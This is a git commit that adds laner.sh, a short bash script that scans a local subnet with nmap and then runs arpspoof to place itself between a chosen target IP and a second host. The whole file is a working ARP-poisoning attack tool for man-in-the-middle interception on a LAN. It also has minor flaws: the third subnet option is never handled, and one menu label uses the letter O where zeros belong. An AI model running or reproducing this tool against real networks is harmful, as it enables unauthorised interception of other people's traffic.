4a917e68d62b29a2871a6d00a670b8c5357a4891
bus7d <bus7dz@gmail.com>
2018-04-09 18:15:17 +0200

    Create laner.sh

---
+++ laner.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+IFACE="wlp2s0"
+
+
+echo "<LAN RECON Scr!pt/>"
+echo "[1]192.168.O.O/24"
+echo "[2]192.168.1.0/24"
+echo "[3]10.0.0.0/24"
+echo "[0]Manual Input" 
+read -p "[>]" SUBNET
+
+if [ $SUBNET = 1 ]; then
+	NETWORK="192.168.0.0/24"
+fi
+if [ $SUBNET = 2 ]; then
+	NETWORK="192.168.1.0/24"
+fi
+if [ $SUBNET = 0 ]; then
+
+read -p "[*]ENTER NETWORK RANGE::" NETWORK
+
+fi
+
+echo "[-]Processing PingSweep....";
+
+nmap -sn $NETWORK |grep report > up.list;
+echo "[!]Serving live hosts list::";
+cat up.list;
+
+echo "[*]SELECT TARGETz"
+
+read -p "[>]ENTER TARGET  IP>>" TARGET1
+read -p "[>]ENTER SOULMATE IP>>" SOULMATE
+
+echo "[/!\POIZONING/!\]"
+arpspoof -i $IFACE -c host -t $TARGET1 -r $SOULMATE 
